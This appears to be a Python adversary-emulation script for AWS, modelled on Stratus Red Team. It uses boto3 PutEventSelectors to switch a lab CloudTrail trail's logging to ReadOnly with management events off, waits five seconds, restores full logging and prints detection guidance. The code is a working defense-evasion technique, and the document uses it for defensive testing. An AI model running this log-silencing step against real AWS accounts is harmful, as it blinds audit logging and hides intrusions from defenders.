"""
Technique : aws.defense-evasion.cloudtrail-event-selectors
Tactic    : Defense Evasion (T1562.001)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target CloudTrail trail.

How the attack works:
  CloudTrail event selectors control which API calls are logged.  An attacker
  with cloudtrail:PutEventSelectors can set ReadWriteType=ReadOnly and
  IncludeManagementEvents=False, effectively silencing all write-event logging
  — the events that reveal attacks (CreateUser, LaunchInstances, etc.).
  The trail remains active and appears healthy, but critical events are dropped.

Detection signal:
  - cloudtrail:PutEventSelectors with IncludeManagementEvents=false or
    ReadWriteType=ReadOnly.
  - Gap in CloudTrail write events immediately following the selector change.

Revert:
  - Automated: PutEventSelectors restoring full management event logging.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import json
import os
import subprocess
import time
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Config ────────────────────────────────────────────────────────────────────

DWELL_TIME_S = 5


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    stack_dir  = str(Path(__file__).parent.parent / "infra")
    infra      = get_pulumi_outputs(stack_dir)
    trail_name = infra.get("trail_name", "stratus-red-team-ct-selectors-trail")

    session   = boto3.Session()
    ct_client = session.client("cloudtrail")

    # ── Step 1: Silence write events via event selectors ──────────────────────
    banner("Step 1 — Disable write event logging (PutEventSelectors)")
    attack_selectors = [
        {
            "ReadWriteType": "ReadOnly",
            "IncludeManagementEvents": False,
            "DataResources": [],
        }
    ]
    try:
        ct_client.put_event_selectors(
            TrailName=trail_name,
            EventSelectors=attack_selectors,
        )
        print(f"  [+] Event selectors applied to trail: {trail_name}")
        print(f"  [+] ReadWriteType=ReadOnly, IncludeManagementEvents=False")
        print(f"  [!] CloudTrail event: cloudtrail:PutEventSelectors")
        print(f"  [!] Write events are now SILENCED — attacks will not appear in CloudTrail.")
    except ClientError as exc:
        print(f"  [!] PutEventSelectors failed: {exc}")
        return

    print(f"\n  Dwelling for {DWELL_TIME_S}s...")
    time.sleep(DWELL_TIME_S)

    # ── Revert: Restore full management event logging ─────────────────────────
    banner("Revert — Restore full management event logging (PutEventSelectors)")
    restore_selectors = [
        {
            "ReadWriteType": "All",
            "IncludeManagementEvents": True,
            "DataResources": [],
        }
    ]
    try:
        ct_client.put_event_selectors(
            TrailName=trail_name,
            EventSelectors=restore_selectors,
        )
        print(f"  [+] Event selectors restored: ReadWriteType=All, IncludeManagementEvents=True")
    except ClientError as exc:
        print(f"  [!] Restore failed: {exc}")

    banner("Complete")
    print("CloudTrail events: cloudtrail:PutEventSelectors x2")
    print("\nDetection guidance:")
    print("  Alert when PutEventSelectors sets IncludeManagementEvents=false or")
    print("  ReadWriteType=ReadOnly on any trail.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the trail.")


if __name__ == "__main__":
    main()
